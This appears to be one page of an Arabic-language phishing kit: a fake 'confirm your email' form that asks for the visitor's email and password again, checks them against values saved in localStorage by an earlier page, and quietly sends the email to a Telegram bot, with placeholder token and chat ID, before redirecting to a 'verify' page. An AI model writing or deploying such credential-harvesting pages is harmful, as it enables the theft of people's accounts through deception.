<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تأكيد الحساب</title>
</head>
<body>
  <h2>تأكيد البريد الإلكتروني</h2>
  <form id="confirmForm">
    <input type="email" id="confirmEmail" placeholder="أعد إدخال البريد الإلكتروني" required><br>
    <input type="password" id="confirmPassword" placeholder="أعد إدخال كلمة المرور" required><br>
    <button type="submit">تأكيد</button>
  </form>

  <script>
    document.getElementById("confirmForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const confirmEmail = document.getElementById("confirmEmail").value;
      const confirmPassword = document.getElementById("confirmPassword").value;

      const originalEmail = localStorage.getItem("email");
      const originalPassword = localStorage.getItem("password");

      if (confirmEmail === originalEmail && confirmPassword === originalPassword) {
        // إرسال تأكيد إلى Telegram
        fetch(`https://api.telegram.org/bot<توكنك>/sendMessage?chat_id=<IDك>&text=✅ تأكيد مطابق\nEmail: ${confirmEmail}`);

        // الانتقال للصفحة الثالثة
        window.location.href = "vifry.html";
      } else {
        alert("❌ البيانات غير متطابقة، حاول مرة أخرى.");
      }
    });
  </script>
</body>
</html>
